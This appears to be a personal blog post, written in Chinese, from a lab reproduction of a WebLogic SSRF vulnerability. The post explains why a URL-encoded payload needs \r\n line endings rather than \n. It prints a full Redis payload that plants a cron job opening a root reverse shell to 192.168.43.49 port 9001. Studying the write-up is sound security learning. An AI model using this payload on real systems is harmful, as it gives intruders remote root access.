@@ -1,0 +1,56 @@
+---
+title: "\\r\\n的问题"
+date: 2023-07-13 17:10:24
+tags:
+    - CTF
+    - 杂谈
+    - Misc
+---
+
+> `\r\n`是我们需要的换行字符，`\r`代表回车，`\n`代表换行
+>
+> `\r`就是回到行首，`\n`就是到下一行的，但是一般我们输出程序时，看不到明显的差别的。通常用的Enter是两个加起来
+>
+> `\r\n`与`\n`是有区别的
+> 如果要通用的则是`\r\n`，因为有些编辑器它不认`\n`
+>
+> Link: https://blog.csdn.net/qq_39118371/article/details/127526198
+
+
+
+`\r\n`的URL编码结果是`%0D%0A`
+
+在一次复现weblogic SSRF漏洞使用Burpsuite发payload的时候发现一个问题，使用自己url编码器编码的payload无法成功，使用网上教程的payload可以。于是我对比了一下两个的区别，居然是缺少了`\r`，payload中需要使用`\r\n`。我感觉这个是老生长谈的问题，之前也遇到过，但是很久远了，于是这次把它记录下来。（de这个bug居然折腾我一天）
+
+payload对比
+
+![截屏2023-07-13 16.03.28](https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/202307131722528.png)
+
+需要执行的payload编码前是
+
+```
+test
+
+set 1 "\n\n\n\n* * * * * root bash -c 'sh -i >& /dev/tcp/192.168.43.49/9001 0>&1'\n\n\n\n"
+config set dir /etc/cron.d/
+config set dbfilename nopwn
+save
+
+aaa
+```
+
+如果直接丢入编码器编码会把换行编码为`\n`，不是我们要的`\r\n`。
+
+![image-20230713144050524](https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/202307131440712.png)
+
+不同的payload发送出去的对比
+
+错误的结果：
+
+![截屏2023-07-13 16.02.22](https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/202307131826122.png)
+
+正确的结果：
+
+![截屏2023-07-13 16.02.49](https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/202307131827771.png)
+
+注：这个问题，虽然简单，但是需要注意，很容易因为这种小错误导致debug半天。还是需要多多练习
